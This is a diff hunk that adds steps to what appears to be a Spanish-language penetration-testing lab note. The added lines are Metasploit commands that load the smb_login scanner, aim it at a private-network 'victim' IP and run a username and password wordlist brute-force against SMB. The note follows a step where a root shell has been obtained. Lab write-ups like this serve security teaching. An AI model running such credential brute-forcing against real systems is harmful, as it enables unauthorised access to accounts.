@@ -101,6 +101,19 @@ Tags: #Windows  #Linux #FTP #SSH #Telnet #SMB #VNC
 ❯ shell 
 
 # Somos usuario root
+
+
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ search smb_login          # Buscamos el exploit
+	❯ use 0                     # Usamos el exploit 'auxiliary/scanner/smb/smb_login'
+	❯ options
+	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
+	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
+	❯ set VERBOSE false
+	❯ run 
+# Enumerar usuarios
 ```
 
 
